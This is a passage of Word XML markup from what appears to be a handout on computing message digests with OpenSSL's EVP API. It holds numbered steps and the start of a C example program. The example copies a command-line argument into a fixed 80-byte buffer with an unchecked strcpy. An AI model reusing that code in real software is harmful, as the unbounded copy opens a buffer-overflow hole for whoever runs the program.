    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP_D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>_ex() func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>eve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>d.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7. C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eanup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>8. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed.</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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>evp.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gc,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char *</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220" w:right="6794"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>MD_C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">X </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>dc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>; const</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>MD *</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d; char </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>npu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[80</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ed char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>AX_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>D_SI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ZE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rcpy(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>npu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[1]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</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220" w:right="6307"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>* In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">*/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t>penSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>_add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>ou can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of ano</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>her</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>gor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>suppor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed by your vers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t>penSSL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>here */</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="61" w:firstLine="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">* For </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ance,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">D2, MD4, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
